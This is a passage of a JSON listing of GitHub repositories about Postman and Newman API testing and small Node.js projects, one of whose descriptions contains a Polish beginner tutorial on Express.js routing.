Postman","fork":false,"created_at":"2019-11-24T23:26:19Z","updated_at":"2019-11-24T23:35:54Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":52937559,"owner_login":"Daiana-Brites-Kirschner","owner_avatar_url":"https://avatars2.githubusercontent.com/u/52937559?v=4","pulled":1,"tags":["test","mock","testes","criar"]},{"id":189019522,"name":"edyst-s19-medium-clone-postman-mockserver","full_name":"haripriya12/edyst-s19-medium-clone-postman-mockserver","description":null,"fork":false,"created_at":"2019-05-28T11:58:26Z","updated_at":"2019-05-28T12:07:17Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":49433950,"owner_login":"haripriya12","owner_avatar_url":"https://avatars2.githubusercontent.com/u/49433950?v=4","pulled":1,"tags":[]},{"id":202735610,"name":"newman_runner","full_name":"Ppamo/newman_runner","description":"A docker image to run Postman tests using Newman NPM package","fork":false,"created_at":"2019-08-16T13:49:09Z","updated_at":"2019-08-16T16:16:34Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":6662326,"owner_login":"Ppamo","owner_avatar_url":"https://avatars2.githubusercontent.com/u/6662326?v=4","pulled":1,"tags":["test","tests","tests ","image","package","docker"]},{"id":160908222,"name":"newman-smoke-testing","full_name":"vcamaral/newman-smoke-testing","description":"Exemplo de smoke testing utilizando o Newman (Postman Collection Runner).","fork":false,"created_at":"2018-12-08T05:44:58Z","updated_at":"2018-12-08T05:53:19Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":860466,"owner_login":"vcamaral","owner_avatar_url":"https://avatars3.githubusercontent.com/u/860466?v=4","pulled":1,"tags":["test","testing","util","utilizando","smoke"]},{"id":161841916,"name":"newman-stub","full_name":"thandon263/newman-stub","description":"This is a newman test runner for comparing api response data to stub examples.","fork":false,"created_at":"2018-12-14T21:24:14Z","updated_at":"2019-11-27T13:30:06Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":18520509,"owner_login":"thandon263","owner_avatar_url":"https://avatars2.githubusercontent.com/u/18520509?v=4","pulled":1,"tags":["test","data","example","newman","response","runner","examples","test run","comparing"]},{"id":199683894,"name":"newman-pro","full_name":"allenheltondev/newman-pro","description":"Newman Runner that uses the Postman-Pro api to pull the latest version of your collections and environments","fork":false,"created_at":"2019-07-30T15:57:09Z","updated_at":"2019-08-20T16:37:23Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":53385551,"owner_login":"allenheltondev","owner_avatar_url":"https://avatars2.githubusercontent.com/u/53385551?v=4","pulled":1,"tags":["test","collect","collection","collections","environment","version","environments","uses","latest","pull"]},{"id":235815766,"name":"selenium-example","full_name":"aplorenzen/selenium-example","description":"An example of how Selenium IDE, selenium-side-runner, Postman and newman can be used to automate regression and smoke testing","fork":false,"created_at":"2020-01-23T14:48:26Z","updated_at":"2020-01-23T14:48:26Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":5021336,"owner_login":"aplorenzen","owner_avatar_url":"https://avatars2.githubusercontent.com/u/5021336?v=4","pulled":1,"tags":["test","testing","auto","example","automat","newman","runner","automate","side","smoke","regression","selenium"]},{"id":206577354,"name":"iis-redirect-generator","full_name":"ScottReed/iis-redirect-generator","description":"A redirect generator for generating IIS redirects in web.config and postman tests","fork":false,"created_at":"2019-09-05T13:59:23Z","updated_at":"2019-09-09T10:23:21Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":1773620,"owner_login":"ScottReed","owner_avatar_url":"https://avatars1.githubusercontent.com/u/1773620?v=4","pulled":1,"tags":["test"," postman","tests","config","rating","generator","postman tests","generating","redirect"]},{"id":197917540,"name":"Complaint-Lodging","full_name":"Shekhar-Shashank/Complaint-Lodging","description":"It is an android complaint lodging app in which the front end is designed in android studio using java language. The restful API that the app interacts with is made using python flask. The database used is sqlite. And the language used to parse the data from the server is Json. For testing the requests like get and post we used postman as a dummy request generator.","fork":false,"created_at":"2019-07-20T10:50:35Z","updated_at":"2019-07-26T06:59:57Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":52148699,"owner_login":"Shekhar-Shashank","owner_avatar_url":"https://avatars1.githubusercontent.com/u/52148699?v=4","pulled":1,"tags":["test"," postman","data","testing","request","rest","server","database","requests","sign","interact","front","java","restful","python","generator","lang","design","parse","flask","designed","android","front end","plain","language","dummy","sqlite","studio","complaint"]},{"id":249174449,"name":"postmanJson","full_name":"PinkaCourt/postmanJson","description":null,"fork":false,"created_at":"2020-03-22T12:03:41Z","updated_at":"2020-03-22T12:03:41Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":50292671,"owner_login":"PinkaCourt","owner_avatar_url":"https://avatars1.githubusercontent.com/u/50292671?v=4","pulled":1,"tags":[]},{"id":91568417,"name":"PostmanJson","full_name":"Angael/PostmanJson","description":null,"fork":false,"created_at":"2017-05-17T11:23:35Z","updated_at":"2017-05-17T11:23:35Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":21974933,"owner_login":"Angael","owner_avatar_url":"https://avatars3.githubusercontent.com/u/21974933?v=4","pulled":1,"tags":[]},{"id":124790768,"name":"005-postmantest","full_name":"figtony/005-postmantest","description":"005 postmantest using json to xml","fork":false,"created_at":"2018-03-11T19:27:14Z","updated_at":"2018-03-11T19:27:14Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":8472745,"owner_login":"figtony","owner_avatar_url":"https://avatars0.githubusercontent.com/u/8472745?v=4","pulled":1,"tags":["test"," postman","json","postmantest"]},{"id":107642297,"name":"TestCasesToJSON","full_name":"endyquang/TestCasesToJSON","description":"A tool that help parsing test cases from excel files to postman format.","fork":false,"created_at":"2017-10-20T06:49:11Z","updated_at":"2019-01-22T15:23:47Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":28825116,"owner_login":"endyquang","owner_avatar_url":"https://avatars1.githubusercontent.com/u/28825116?v=4","pulled":1,"tags":["test"," postman","form","file","tool","format","help","files","case","cases","excel","parsing"]},{"id":131483815,"name":"todolistpostmancollection","full_name":"AnilDeshpande/todolistpostmancollection","description":"Just contains POSTMAN collection json files which can be imported by the people who want to use this to test the web services","fork":false,"created_at":"2018-04-29T10:05:05Z","updated_at":"2018-09-30T14:40:52Z","stargazers_count":0,"watchers_count":0,"forks":3,"watchers":0,"score":1,"owner_id":7361268,"owner_login":"AnilDeshpande","owner_avatar_url":"https://avatars2.githubusercontent.com/u/7361268?v=4","pulled":1,"tags":["test","collect","collection","file","service","json","contain","files","services","import","imported"]},{"id":143275857,"name":"swagger2postman","full_name":"thneeb/swagger2postman","description":"This little nodejs tool gets a swagger.json on the one hand and generated a postman collection file for testing the specified api on the other hand.","fork":false,"created_at":"2018-08-02T09:54:03Z","updated_at":"2018-11-20T08:14:35Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":26486066,"owner_login":"thneeb","owner_avatar_url":"https://avatars0.githubusercontent.com/u/26486066?v=4","pulled":1,"tags":["test"," postman","collect","collection","testing","postman collection","file","tool","node","json","generate","spec","swagger","nodejs","generated","gets","little"]},{"id":122043429,"name":"test-API","full_name":"garybeattiejr/test-API","description":"This is my test API. Developed with Javascript, JSON, Node, Postman, Nodemon, Express, Body-Parser.","fork":false,"created_at":"2018-02-19T09:52:03Z","updated_at":"2018-02-19T10:04:39Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":36244950,"owner_login":"garybeattiejr","owner_avatar_url":"https://avatars0.githubusercontent.com/u/36244950?v=4","pulled":1,"tags":["test","script","demo"]},{"id":199407927,"name":"ServletsTask_Part1","full_name":"Mipside/ServletsTask_Part1","description":" Servlets task with CRUD Operations, json files that are testing via Postman","fork":false,"created_at":"2019-07-29T08:08:14Z","updated_at":"2019-07-29T08:11:58Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":45482921,"owner_login":"Mipside","owner_avatar_url":"https://avatars2.githubusercontent.com/u/45482921?v=4","pulled":1,"tags":["test","testing","file","json","files","task","lets"]},{"id":212612216,"name":"Implementing-JWT-using-Node.js","full_name":"mohitsood5934/Implementing-JWT-using-Node.js","description":"I have implemented JSON Web Token for user authentication.I have used POSTMAN API for the testing purpose","fork":false,"created_at":"2019-10-03T15:20:58Z","updated_at":"2019-10-03T15:30:31Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":26309496,"owner_login":"mohitsood5934","owner_avatar_url":"https://avatars3.githubusercontent.com/u/26309496?v=4","pulled":1,"tags":["test","testing","user","implement","auth","authentication","implemented"]},{"id":249718740,"name":"EmployeeMangement_CRUD_WebApi","full_name":"SD7689/EmployeeMangement_CRUD_WebApi","description":"JSON Server Employee CRUD API and testing using Postman and Swagger , Days Employee Login and Employee CRUD API using WebAPI ","fork":false,"created_at":"2020-03-24T13:42:51Z","updated_at":"2020-03-29T17:07:04Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":59974361,"owner_login":"SD7689","owner_avatar_url":"https://avatars0.githubusercontent.com/u/59974361?v=4","pulled":1,"tags":["test","testing"]},{"id":215976073,"name":"TestApi","full_name":"Oghenetega3000/TestApi","description":"An api that collects employee information in JSON format and uploads it to a database (to be tested in Postman)","fork":false,"created_at":"2019-10-18T08:21:57Z","updated_at":"2019-10-23T09:55:17Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":49581759,"owner_login":"Oghenetega3000","owner_avatar_url":"https://avatars0.githubusercontent.com/u/49581759?v=4","pulled":1,"tags":["test","collect","data","form","database","format","tested","load","info","infor","information","upload","employee","collects"]},{"id":141588502,"name":"FlagApi","full_name":"bflaven/FlagApi","description":"A basic application to get information about countries via a RESTful API (Node.JS Version). This application will be used for test explanations purpose.","fork":false,"created_at":"2018-07-19T14:06:54Z","updated_at":"2018-12-20T04:15:13Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":5916084,"owner_login":"bflaven","owner_avatar_url":"https://avatars2.githubusercontent.com/u/5916084?v=4","pulled":1,"tags":["test","form","application","format","info","infor","information","countries"]},{"id":193157969,"name":"jsonwebtoken","full_name":"gloryer/jsonwebtoken","description":"A demo back end server exposes user registration endpoint, user authentication endpoint, token endpoint and resource endpoint. The resource endpoint is protected by the JWT token. Only the client who possesses the valid token can access the resource. To get a token from the server, the client must authenticates itself to the server. To request the resource in the server, the client issue an http GET request to the resource endpoint, the server will verify the recieved jwt token. Once the token is valid, the server will send back the user information which indicated in the jwt token.  Front-end has not been implemented so far. The back-end is tested using Postman.","fork":false,"created_at":"2019-06-21T20:43:09Z","updated_at":"2019-06-21T20:52:18Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":18592154,"owner_login":"gloryer","owner_avatar_url":"https://avatars3.githubusercontent.com/u/18592154?v=4","pulled":1,"tags":["test","request","form","server","client","http","user","implement","format","auth","endpoint","tested","demo","send","source","authentication","info","access","infor","resource","information","token","esse","implemented","expose","been","authenticate","exposes","back end","verify","issue","registration","recieve"]},{"id":161693321,"name":"simple-api-php","full_name":"omarabdeljelil/simple-api-php","description":"Simple php RESTful API that return JSON data, with frontend (AJAX POST and GET), all the CRUD operations are tested with Postman","fork":false,"created_at":"2018-12-13T20:48:42Z","updated_at":"2018-12-15T18:43:50Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":24657418,"owner_login":"omarabdeljelil","owner_avatar_url":"https://avatars3.githubusercontent.com/u/24657418?v=4","pulled":1,"tags":["test","data","tested","operation","front","operations","frontend"]},{"id":246064766,"name":"CapstoneBackEnd","full_name":"riesdn/CapstoneBackEnd","description":"The back end code for the .Net Spring Bootcamp Capstone project including .Net C# with Entity Framework, SQL, and JSON, tested through Postman.","fork":false,"created_at":"2020-03-09T14:56:55Z","updated_at":"2020-03-10T18:17:45Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":42923721,"owner_login":"riesdn","owner_avatar_url":"https://avatars0.githubusercontent.com/u/42923721?v=4","pulled":1,"tags":["test","code","tested","including","back end"]},{"id":177665978,"name":"Jedi","full_name":"KennethNL/Jedi","description":"This experimental project involved the conversion of a Gherkin-based input file to a JSON-based configuration of Postman with the end goal of API testing.","fork":false,"created_at":"2019-03-25T21:16:17Z","updated_at":"2019-04-10T10:01:18Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":44347880,"owner_login":"KennethNL","owner_avatar_url":"https://avatars1.githubusercontent.com/u/44347880?v=4","pulled":1,"tags":["test","testing","file","based","version","config","configuration","experiment","goal","experimental"]},{"id":198035809,"name":"Contact-Keeper-with-React","full_name":"potaeko/Contact-Keeper-with-React","description":"Contact Keeper with JWT authentication created with MongoDB Atlas cloud database, Express, React, Node.js (MERN) , JSON Web Tokens (JWT), Concurrently npm and testing routes with POSTMAN. Project from Udemy online course","fork":false,"created_at":"2019-07-21T09:09:44Z","updated_at":"2019-08-27T11:14:20Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":30098599,"owner_login":"potaeko","owner_avatar_url":"https://avatars0.githubusercontent.com/u/30098599?v=4","pulled":1,"tags":["test","create","data","testing","database","auth","line","route","routes","authentication","rent","course","cloud","current","online","currently"]},{"id":110963819,"name":"MyFirstApp","full_name":"smmcgrath/MyFirstApp","description":"Built in Node.js open source server framework. In this project I moved from client-side development (using JavaScript, HTML, and CSS) to building a server-side web application using the Express.js web framework hosted in Node.js runtime environment. The site includes a flatty style landing page including navigatation bar, sign-up forms, staff info etc. It has an uncluttered and minimal UI. The backend API’s communicated with databases designed using MongoDB, an example of a NoSQL database program using JSON-like objects with schemas. All APIs, including GET, PUT, UPDATE and DELETE were tested using Postman. Great experience using PuTTY open-source terminal emulator, working remotely over SSH network protocol. Securing my API with authentication; hashing passwords using Bcrypt and issuing tokens with JSON Web Token (JWT). New additions help to restrict access and ensure tokens are verified. Previous to this the back-end APIs could be easily accessed via the URL. User comments coudl be retrieved, new ones saved, deleted or updated. Hashing is a means of transforming a string of characters (passwords, in my case) into a different and larger set of characters, thus protecting our sensitive data. Bcrypt is the password hashing function used.","fork":false,"created_at":"2017-11-16T11:34:16Z","updated_at":"2018-12-15T19:14:11Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":30355322,"owner_login":"smmcgrath","owner_avatar_url":"https://avatars2.githubusercontent.com/u/30355322?v=4","pulled":1,"tags":["test","data","form","application","rest","server","client","database","develop","example","sign","environment","auth","tested","framework","help","build","function","site","source","authentication","update","rent","host","delete","development","backend","info","access","working","program","side","web app","open","object","case","token","esse","building","design","were","easily","includes","including","mini","schema","designed","retrieve","objects","style","remote","network","terminal","updated","communicate","comments","hosted","words","tokens","transform","mean","schemas","accessed","moved","restrict","protecting","transforming","minimal","databases"]},{"id":138470813,"name":"node.js-socialNetwork","full_name":"guys1444/node.js-socialNetwork","description":"socialNetwork that ive made in node.js Building an extensive backend API with Node.js & Express Protecting routes/endpoints with JWT (JSON Web Tokens) Extensive API testing with Postman Integrating React with our backend in an elegant way, creating a great workflow Building our frontend to work with the API Using Redux for app state management Creating reducers and actions for our resources Creating many container components that integrate with Redux Testing with the Redux Chrome extension ,MERN STACK","fork":false,"created_at":"2018-06-24T09:53:49Z","updated_at":"2018-06-24T09:53:49Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":32614636,"owner_login":"guys1444","owner_avatar_url":"https://avatars3.githubusercontent.com/u/32614636?v=4","pulled":1,"tags":["test","testing","node","contain","endpoint","points","route","manage","endpoints","routes","source","front","stat","creating","extension","backend","rating","action","resource","management","resources","integrate","frontend","container","many","social","workflow","component","components","elegant"]},{"id":174555369,"name":"mern_devconnector","full_name":"SalahEddine007/mern_devconnector","description":"Welcome to \"MERN Stack Front To Back\". In this course we will build an in depth full stack social network application using Node.js, Express, React, Redux and MongoDB along with ES6+. We will start with a bank text editor and end with a deployed full stack application. This course includes...  Building an extensive backend API with Node.js & Express Protecting routes/endpoints with JWT (JSON Web Tokens) Extensive API testing with Postman Integrating React with our backend in an elegant way, creating a great workflow Building our frontend to work with the API Using Redux for app state management Creating reducers and actions for our resources Creating many container components that integrate with Redux Testing with the Redux Chrome extension Creating a build script, securing our keys and deploy to Heroku using Git This is NOT an \"Intro to React\" or \"Intro to Node\" course. It is a practical hands on course for building an app using the incredible MERN stack. I do try and explain everything as I go so it is possible to follow without React/Node experience but it is recommended that you know at least the basics first.","fork":false,"created_at":"2019-03-08T14:50:34Z","updated_at":"2019-03-08T14:50:34Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":34078780,"owner_login":"SalahEddine007","owner_avatar_url":"https://avatars1.githubusercontent.com/u/34078780?v=4","pulled":1,"tags":["test","testing","application","script","contain","endpoint","points","route","build","manage","endpoints","full","routes","star","source","front","stat","creating","course","start","extension","very","backend","rating","action","resource","long","management","stack","ever","building","resources","text","integrate","edit","includes","deployed","frontend","along","container","many","network","social","plain","workflow","basics","component","full stack","components","editor","explain","bank","elegant","least","practica","every"]},{"id":119091462,"name":"Zadanie_17_5","full_name":"martinproxy0/Zadanie_17_5","description":" 17. ExpressJS - ekspresowe tworzenie aplikacji w NodeJS Wyzwania: Dowiesz się czym jest ExpressJS Nauczysz się korzystać z routingu Poznasz czym są szablony 17.1. Wprowadzenie do Expressa Express jest jednym z najpopularniejszych frameworków dla aplikacji pisanych w Node.js. Jest bardzo lekki i pozwala na lepszą organizację aplikacji w modelu MVC. Ok, zwolnijmy. Już na samym starcie pojawiły się dwa pojęcia, których do tej pory nie omówiliśmy zbyt dokładnie: framework i MVC. Na początku przypomnijmy sobie czym jest framework.  Czym są frameworki? Framework to swego rodzaju szkielet, na którym opieramy budowę naszej aplikacji. Jest pewnym poziomem abstrakcji, na której konstruujemy naszą aplikację.  Czym jest abstrakcja? Abstrakcja w inżynierii oprogramowania to technika, dzięki której jesteśmy w stanie zapanować nad złożonością systemu. Najzwyczajniej w świecie nie da się myśleć na wielu płaszczyznach na raz, dlatego programiści dzielą problemy na pewne poziomy i to na nich rozwiązują mniejsze problemy. Przykładowo - programista korzystający z Reacta nie martwi się o niższy poziom abstrakcji, z którego nieświadomie korzysta używając Reacta. Korzystając z komputera także nie zastanawiamy się za bardzo co dzieje się w środku procesora czy też w jaki sposób jest skonstruowany. Tym poziomem abstrakcji po prostu nie zawracamy sobie głowy. Używając JavaScriptu nie myślimy w jaki sposób parser analizuje składnię języka. Jeśli nie jest to nam potrzebne, to możemy zająć się tym, co jest dla nas naprawdę istotne - pisaniem aplikacji internetowych!  Express to właśnie kolejny, wyższy poziom abstrakcji, dzięki któremu możemy skupić się na właściwym problemie. Zawiera zbiór generycznych (możliwych do zastosowania w wielu miejscach / uniwersalnych) funkcjonalności, które powtarzają się w obrębie każdej aplikacji. Cały zamysł frameworka opiera się na zasadzie - nie wymyślaj koła na nowo, bo można budować na podstawie dobrych, uniwersalnych rozwiązań. Po wykonaniu tego samego zadania wiele razy, człowiek instynktownie szuka sposobu na automatyzację problemu - szczególnie leniwy programista. :)  Framework ma niestety jedną wadę, która bywa momentami również zaletą - narzuca programiście sposób w jaki należy rozwiązać problem. Takie podejście z jednej strony nieco nas ogranicza, bo nie pozwala nam 'grzebać' w rozwiązaniu, a z drugiej strony zmniejsza ilość miejsc, w których moglibyśmy popełnić jakiś błąd. Zaletą takiego podejścia jest też to, że programiści korzystający z frameworków często borykają się z podobnymi problemami, przez co łatwo jest znaleźć rozwiązania, bo ktoś już na pewno zetknął się z czymś, co sprawia nam kłopot :)  Wracając do Expressa - jest on niewielkim frameworkiem, który daje programiście przyjemną podstawkę do tworzenia aplikacji, ale nie narzuca żadnych praktyk - może o tym świadczyć chociażby fakt, że wiele znanych frameworków opiera swoją budowę na Express. Można do nich zaliczyć przykładowo Loopbacka, Sailsa czy Krakena.  Model-View-Controller Ok, wiemy już czym jest framework - pora na pojęcie MVC :) Jest to skrót od ang. Model View Controller (Model Widok Kontroler). Jest jednym z najczęściej przewijających się wzorców architektonicznych w internecie. Popularnością pomału wypiera go architektura Flux, o której coraz częściej słychać (szczególnie w środowisku Reacta), ale o tym wzorcu powiemy sobie jeszcze przy okazji omawiania Reduxa - wróćmy do MVC.  Głównym założeniem przyjętym podczas projektowania MVC było oddzielenie warstwy prezentacji od logiki biznesowej aplikacji. To podejście umożliwia tworzenie narzędzi działających bez graficznego interfejsu (zastępuje go wtedy tzw. Command Line Interface, a.k.a. CLI) i jest dalej popularne w środowisku Unixowym. Tak więc:  Model jest reprezentacją logiki aplikacji / problemu z jakim się zmagamy / domeną. Widok opisuje w jaki sposób coś wyświetlić. W React są to komponenty (szczególnie te prezentacyjne). Kontroler przyjmuje dane od użytkownika aplikacji i reaguje na jego działania w obrębie widoku. Aktualizuje widok i model aplikacji. O samej architekturze można napisać osobny moduł tym bardziej, że jak już wcześniej wspomnieliśmy bardzo często przewija się on w środowisku front-end developerów i jest częścią składową wielu frameworków. Sama implementacja MVC wymaga wiedzy na temat programowania obiektowego i wzorców projektowych. Zainteresowanych zapraszam do przeczytania tej książki na temat wzorców projektowych stosowanych w JavaScripcie.  Express dostarcza wielu funkcjonalności do tworzenia aplikacji webowych. Jak już wspomniałem, ułatwia on przede wszystkim szybki rozwój aplikacji opartych na Node.js. Podstawowymi cechami tego frameworka są:  serwowanie plików statycznych za pomocą jednej komendy konfigurowanie middleware, czyli pośrednika między żądaniem a odpowiedzią w momencie, kiedy użytkownik wykonuje jakieś akcje, np. wysyła formularz, middleware może wykonać pewne czynności zanim dane zostaną zapisane. Nie sprowadza się to oczywiście tylko do zapisu danych, ale szerzej na temat tego zagadnienia powiemy sobie w dalszym rozdziale definiowanie tablicy routingu, czyli ścieżek (adresów), które wyświetlają odpowiednie treści, przyjmują i zapisują dane, bądź odpytane o dane zwracają je. Bazują na protokole HTTP oraz URI (ang. Uniform Resource Identifier) pozwala na dynamiczne tworzenie stron HTML bazujących na argumentach przekazanych do istniejących szablonów Nie przejmuj się, jeśli powyższe opisy wydają się być nieco zagmatwane. Kolejne rozdziały rozjaśnią sprawę! Zanim jednak przejdziemy do omawiania poszczególnych funkcjonalności Expressa, przeprowadzimy proces instalacji.  Jeśli masz wątpliwości do powyższego materiału, to - zanim zatwierdzisz - zapytaj na czacie :) Zapoznałe(a)m się! 17.2. Instalacja ExpressJS Framework Express instalujemy używając npm, analogicznie do innych pakietów, które dodawaliśmy już we wcześniejszych modułach. Dla przypomnienia, wystarczy, że zainicjujesz swój projekt - npm init, a następnie użyjesz komendy npm install express --save, która zapisze zainstalowany pakiet w katalogu node_modules/ i doda go do sekcji dependencies w pliku package.json.  Razem z Expressem należy zainstalować jeszcze jeden ważny moduł - body-parser, który jest pakietem pozwalającym na obsługę różnych formatów danych w middleware takich jak JSON, text czy tzw. surowe dane (ang. raw data). Aby go zainstalować, wpisz npm install body-parser --save.  Pierwsza aplikacja w ExpressJS Sprawdźmy teraz, czy wszystko działa tak jak powinno. Testowa aplikacja, jaką stworzymy przy użyciu Expressa, będzie przedstawiała podstawową zasadę działania tego frameworka. Aplikacja uruchomi serwer oraz będzie nasłuchiwać na porcie 3000 w oczekiwaniu na połączenie - dokładnie w taki sam sposób, jak w przypadku serwera HTTP napisanego w “czystym\" Node.js. Nasłuchiwanie oznacza nic innego jak oczekiwanie na połączenie - po wystąpieniu żądania, serwer odpowie nam klasycznym “Hello world\".  Zanim zaczniemy tworzyć aplikację, musimy wytłumaczyć sobie pewne pojęcia.  Opis pojęcia routingu Routing to sposób określania jak aplikacja będzie odpowiadać na żądania klienta na dane endpointy przy użyciu konkretnych metod HTTP. Przypomnijmy sobie w jaki sposób wyglądały metody HTTP:  GET - najprostsza z metod HTTP - służy do pobierania zasobów z serwera. Pobranymi zasobami mogą być np. pliki HTML, CSS, JavaScript czy obiekty JSON / XML. POST - ta metoda jest używana do wysyłania danych do serwera. Stosuje się ją np. przy formularzach lub przy wstawianiu zdjęć i wysyłaniu ich jako załącznik. Zwykle dane te wysyłane są jako para klucz-wartość. PUT - działa podobnie jak POST, czyli również służy do wysyłania danych. Różnicą jest ograniczenie do wysłania tylko jednej porcji danych - np. jednego pola. Metoda ta najczęściej używana jest do aktualizacji istniejących danych DELETE - metoda, która służy do usuwania danych z serwera. Chodzi oczywiście o dane, które zostały wskazane przy wysyłaniu żądania. Kolejnym pojęciem jest URI (nazywane również PATH) - jest to właśnie wspomniany wcześniej endpoint, który zawiera polecenia do wykonania gdy zostanie wywołany przez żądanie.  Czas start! Na początek stwórzmy plik server.js w katalogu z projektem. Po zainstalowaniu powyższych zależności, drzewo projektu powinno wyglądać w następujący sposób:   Aby mieć możliwość skorzystania z zainstalowanych zależności, na początku należy zadeklarować zmienną, w której będziemy przechowywać funkcjonalności pakietu Expressa.  var express = require('express'); Jak widzisz, każda paczka JS'a działa dokładnie w taki sam sposób. Koncepcja modułów będzie przewijać się aż do końca tego kursu. Następnym krokiem będzie stworzenie aplikacji Express:  var app = express(); Naszą aplikację przypisaliśmy do zmiennej app. Teraz możemy sprawić, aby odpowiadała prostym Hello world w momencie, w którym odbierzemy wysłane zapytanie GET na adres strony domowej:  app.get('/', function(req, res) {     res.send('Hello world'); }); Powyższy kod rejestruje pierwszy routing (proces przetwarzania otrzymanego adresu żądania i na jego podstawie decydowanie, co powinno zostać uruchomione) na wysłane żądanie GET po wejściu na stronę główną ( http://localhost:3000/ ). Jako callback na wystąpienie tego zdarzenia wywoływana jest funkcja, która w przypadku udanej odpowiedzi wyśle wiadomość Hello world.  To jednak jeszcze nie koniec. Zarejestrowaliśmy obsługę pierwszego routingu, ale należy zainicjować nasłuchiwanie serwera na to i inne zdarzenia. Dopiszmy więc:  var server = app.listen(3000, function() {     console.log('Przykładowa aplikacja nasłuchuje na http://localhost:3000'); }); Po zapisaniu powyższego kodu, należy uruchomić go komendą node server.js (lub za pomocą Nodemona, którego poznaliśmy w pierwszym module) - teraz po ponownym wejściu na adres http://localhost:3000/ powinniśmy zobaczyć następujący widok:   Jest to znak, że nasza aplikacja działa!  Jeśli masz wątpliwości do powyższego materiału, to - zanim zatwierdzisz - zapytaj na czacie :) Zapoznałe(a)m się! 17.3. Route, czyli ścieżka wyznaczona dla użytkownika aplikacji Wykorzystanie endpointów Rozwińmy teraz trochę aplikację stworzoną w poprzednim podrozdziale. Aktualnie kod w pliku server.js wygląda następująco:  var express = require('express'); var app = express();  app.get('/', function (req, res) {     res.send('Hello world'); });  var server = app.listen(3000, function() {     console.log('Przykładowa aplikacja nasłuchuje na http://localhost:3000'); }); Endpointy statyczne Na początek zmodyfikujemy lekko żądanie GET i do strony głównej zamiast Hello world! wpiszmy Hello GET! oraz dodamy linijkę drukującą otrzymane żądanie (po stronie serwera) jak poniżej:  app.get('/', function (req, res) {     console.log('Otrzymałem żądanie GET do strony głównej');     res.send('Hello GET!'); }); Warto w tym miejscu wspomnieć o narzędziu Postman - możesz pobrać je ze strony https://www.getpostman.com/. Używa się go do testowania endpointów. Postman jest prosty i intuicyjny w obsłudze - wystarczy, że podasz adres oraz metodę HTTP, jakiej chcesz użyć w odpowiednich polach i… już :) Pozostaje tylko wysłanie requesta i sprawdzenie czy response zgadza się z naszymi oczekiwaniami.   Dodajmy też inne metody HTTP do naszej aplikacji. Zacznijmy od POST. Dla tej i kolejnej metody wykonamy podobne operacje. Chodzi tutaj o to, aby zaobserwować działanie zarejestrowanych endpointów.  app.post('/', function (req, res) {     console.log('Otrzymałem żądanie POST do strony głównej');     res.send('Hello POST!'); }); Do tego czasu oba nasze zapytania kierowaliśmy do strony domowej. Dodajmy teraz obsługę żądania z metodą DELETE oraz inną ścieżką:  app.delete('/del_user', function (req, res) {     console.log('Otrzymałem żądanie DELETE do strony /del_user');     res.send('Hello DELETE!'); }); DLA CHĘTNYCH: Przetestuj powyższe zapytanie w Postmanie! :)  Dla praktyki, dodajmy jeszcze kilka innych endpointów, a następnie przejdźmy do testowania.  app.get('/list_user', function (req, res) {     console.log('Otrzymałem żądanie GET do strony /list_user');     res.send('Strona z listą użytkowników!'); });  app.get('/ab*cd', function(req, res) {     console.log('Otrzymałem żądanie GET do strony /ab*cd');     res.send('Wzór pasuje'); }); Po dodaniu powyższych fragmentów kodu zapisz plik server.js, a następnie ponownie użyj komendy node server.js chyba, że używasz Nodemona :)  Zerknijmy na endpoint /list_user   Otrzymaliśmy to, czego oczekiwaliśmy. Sprawdźmy jeszcze inne.    Jeśli jednak użyliśmy endpointa, którego nie zdefiniowaliśmy, otrzymamy odpowiedź jak na ostatnim obrazku.  Endpointy dynamiczne Istnieje również inny typ endpointów, które nazywa się dynamicznymi. Używanie ich pozwala na przekazywanie parametrów i bazowanie na nich. Wróćmy na moment do kodu stworzonego na samym początku:  var express = require('express'); var app = express();  app.get('/', function (req, res) {     res.send('Hello world'); });  var server = app.listen(3000, function() {     console.log('Przykładowa aplikacja nasłuchuje na http://localhost:3000'); }); Najpierw zmodyfikujemy trochę bazowy kod. Usuńmy linijki 8-10, które miały nam tylko pokazać podstawowe informacje na temat serwera. Zamiast tego napiszmy po prostu: app.listen(3000);  Tworzenie dynamicznego routingu pozwala na przekazywanie parametrów, więc spróbujmy najpierw z przykładowym id. Zamiast odwołać się do strony domowej ('/'), odwołajmy się do zmiennego parametru id. Parametr zmienny od statycznego rozróżnia się poprzez dodanie dwukropka 